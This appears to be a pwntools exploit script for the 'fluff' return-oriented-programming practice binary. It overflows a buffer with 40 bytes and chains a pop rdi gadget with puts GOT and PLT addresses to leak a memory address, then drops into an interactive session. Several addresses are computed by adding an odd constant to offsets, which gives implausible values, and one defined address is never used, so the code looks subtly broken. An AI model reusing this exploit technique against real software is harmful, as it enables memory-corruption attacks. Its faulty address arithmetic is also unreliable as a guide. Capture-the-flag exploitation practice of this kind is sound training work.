from pwn import *

elf = context.binary = ELF("./fluff")
#context.log_level = 'debug'

p = process()

print_file_plt = 0x0000000000400510
ret = 0x0000000000400295
puts_plt = 4193229+0x0000000000000730
puts_got = 4193229+0x201018
pop_rdi = 0x00000000004006a3

payload = b'A'*40
#payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)

p.sendline(payload)
p.interactive()
